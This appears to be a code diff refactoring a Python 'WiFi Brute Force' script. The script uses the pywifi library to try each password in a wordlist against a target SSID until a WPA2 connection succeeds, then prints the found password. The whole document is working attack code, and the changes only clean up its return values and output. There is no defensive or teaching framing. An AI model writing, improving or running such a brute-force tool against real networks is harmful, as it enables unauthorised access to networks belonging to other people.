@@ -9,15 +9,15 @@
 
 import os
 import time
+from pywifi import PyWiFi, const, Profile
 
 def main(ssid, password):
-    from pywifi import PyWiFi, const, Profile
     wifi = PyWiFi()
     iface = wifi.interfaces()[0]
     iface.disconnect()
     time.sleep(1)
     
-    profile = Profile() 
+    profile = Profile()
     profile.ssid = ssid
     profile.auth = const.AUTH_ALG_OPEN
     profile.akm.append(const.AKM_TYPE_WPA2PSK)
@@ -30,22 +30,21 @@ def main(ssid, password):
     time.sleep(2)  # Allow more time for connection
     
     if iface.status() == const.IFACE_CONNECTED:
-        print("[+] Password Found!")
-        print("[+] Password is: " + password)
-        return "Success"
+        return True  # Connection successful
     else:
-        print("[-] Password Not Found! : " + password)
+        return False  # Connection failed
 
 def pwd(ssid, file):
     with open(file, 'r', encoding='utf8') as words:
         for line in words:
             pwd = line.strip()  # Clean up the password
-            result = main(ssid, pwd)
-            if result == "Success":
-                break
+            if main(ssid, pwd):
+                print(f"[+] Password Found: {pwd}")
+                return  # Stop further attempts when password is found
+    print("[-] Password Not Found in the provided wordlist.")
 
 def menu():
-    print("""
+    print(r"""
  __      ___  __ _   ___          _         ___               
  \ \    / (_)/ _(_) | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ 
   \ \/\/ /| |  _| | | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
@@ -62,4 +61,3 @@ def menu():
 
 if __name__ == "__main__":
     menu()
-    
